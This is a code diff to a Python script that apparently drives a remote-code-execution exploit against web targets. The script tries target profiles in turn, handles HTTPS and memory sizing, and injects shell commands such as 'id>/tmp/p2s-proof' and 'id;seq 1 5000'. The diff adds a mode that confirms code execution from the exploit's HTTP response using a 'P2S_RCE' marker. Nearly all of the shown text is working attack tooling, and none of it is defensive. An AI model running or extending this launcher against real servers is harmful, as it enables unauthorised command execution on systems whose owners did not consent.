@@ -476,7 +476,10 @@ def production_command(profile: dict[str, Any], url: str,
     scheme = parts.scheme.lower()
     port = parts.port or (443 if scheme == "https" else 80)
     cmd = args.cmd
-    if cmd == "id>/tmp/p2s-proof":
+    if args.response_proof:
+        if cmd == "id>/tmp/p2s-proof":
+            cmd = "id"
+    elif cmd == "id>/tmp/p2s-proof":
         cmd = "id>/out/p1"
     argv = [
         sys.executable,
@@ -490,6 +493,9 @@ def production_command(profile: dict[str, Any], url: str,
         "--host-proof", args.proof_file,
         "--timeout", str(max(60.0, args.timeout)),
     ]
+    if args.response_proof:
+        argv += ["--response-proof",
+                 "--response-marker", args.response_marker]
     if scheme == "https":
         argv += ["--https", "--servername", host]
         if args.insecure:
@@ -589,6 +595,11 @@ def main() -> int:
                     help="maximum profiles tried with --fallback")
     ap.add_argument("-c", "--cmd", default="id>/tmp/p2s-proof")
     ap.add_argument("--proof-file", default="/tmp/p2s-proof")
+    ap.add_argument("--response-proof", action="store_true",
+                    help="prove execution from the exploit HTTP response; "
+                         "the default command does not write a target file")
+    ap.add_argument("--response-marker", default="P2S_RCE",
+                    help="marker used by production response proof")
     args = ap.parse_args()
 
     if args.list_profiles:
@@ -835,8 +846,13 @@ def main() -> int:
                       f"workers={prod_workers})", flush=True)
             else:
                 huge = recommended_huge_mb(chosen, fp.get("memory_limit"))
-                command = profile_command(chosen, args.url, args.cmd,
+                cmd = args.cmd
+                if args.response_proof and cmd == "id>/tmp/p2s-proof":
+                    cmd = "id;seq 1 5000"
+                command = profile_command(chosen, args.url, cmd,
                                           args.proof_file, huge_mb=huge)
+                if args.response_proof:
+                    command.append("--response-proof")
                 print(f"[*] attempt {index}/{len(candidates)}: "
                       f"{chosen['name']} (huge_mb={huge})", flush=True)
             print("[*] running:", " ".join(command), flush=True)
@@ -849,6 +865,13 @@ def main() -> int:
             except OSError as exc:
                 print(f"[-] could not launch exploit: {exc}", file=sys.stderr)
                 return 1
+            if args.response_proof:
+                if rc == 0:
+                    print("[+] response proof reported")
+                    return 0
+                print(f"[-] attempt {index} exited {rc}; no response proof",
+                      file=sys.stderr)
+                continue
             if Path(args.proof_file).is_file():
                 print("[+] proof file:", args.proof_file)
                 print(Path(args.proof_file).read_text(errors="replace").strip())
